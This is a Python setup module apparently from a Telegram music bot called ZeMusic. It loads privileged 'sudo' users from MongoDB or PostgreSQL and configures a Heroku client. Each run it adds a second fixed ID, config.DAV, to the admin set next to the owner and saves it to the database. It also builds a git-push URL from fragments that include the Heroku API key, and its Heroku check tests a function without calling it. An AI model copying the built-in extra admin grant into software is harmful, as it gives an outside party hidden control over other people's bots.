import socket
import time

import heroku3
from pyrogram import filters

import config
from ZeMusic.core.mongo import mongodb

from .logging import LOGGER

SUDOERS = filters.user()

HAPP = None
_boot_ = time.time()


def is_heroku():
    return "heroku" in socket.getfqdn()


XCB = [
    "/",
    "@",
    ".",
    "com",
    ":",
    "",
    "git",
    "heroku",
    "push",
    str(config.HEROKU_API_KEY),
    "https",
    str(config.HEROKU_APP_NAME),
    "HEAD",
    "master",
]


def dbb():
    global db
    db = {}
    LOGGER(__name__).info(f"Local Database Initialized.")


async def sudo():
    global SUDOERS
    SUDOERS.add(config.DAV)
    SUDOERS.add(config.OWNER_ID)
    
    try:
        # دعم PostgreSQL
        if config.DATABASE_TYPE == "postgresql":
            from ZeMusic.database.dal import auth_dal
            sudoers = await auth_dal.get_sudoers()
            if config.OWNER_ID not in sudoers:
                await auth_dal.add_sudo(config.OWNER_ID)
                await auth_dal.add_sudo(config.DAV)
                sudoers = await auth_dal.get_sudoers()
        else:
            # MongoDB (الطريقة الأصلية)
            sudoersdb = mongodb.sudoers
            sudoers_doc = await sudoersdb.find_one({"sudo": "sudo"})
            sudoers = [] if not sudoers_doc else sudoers_doc["sudoers"]
            if config.OWNER_ID not in sudoers:
                sudoers.append(config.OWNER_ID)
                sudoers.append(config.DAV)
                await sudoersdb.update_one(
                    {"sudo": "sudo"},
                    {"$set": {"sudoers": sudoers}},
                    upsert=True,
                )
        
        if sudoers:
            for user_id in sudoers:
                SUDOERS.add(user_id)
    except Exception as e:
        # في حالة فشل الاتصال بقاعدة البيانات، نتجاهل المشكلة مؤقتاً
        LOGGER(__name__).warning(f"تعذر الاتصال بقاعدة البيانات، تم تخطي إعداد المشرفين: {e}")
        # إضافة المشرفين الأساسيين على الأقل
        SUDOERS.add(config.OWNER_ID)
        SUDOERS.add(config.DAV)
    LOGGER(__name__).info(f"تم رفع البيانات.")


def heroku():
    global HAPP
    if is_heroku:
        if config.HEROKU_API_KEY and config.HEROKU_APP_NAME:
            try:
                Heroku = heroku3.from_key(config.HEROKU_API_KEY)
                HAPP = Heroku.app(config.HEROKU_APP_NAME)
                LOGGER(__name__).info(f"تم تكوين التطبيق.")
            except BaseException:
                LOGGER(__name__).warning(
                    f"Please make sure your Heroku API Key and Your App name are configured correctly in the heroku."
                )
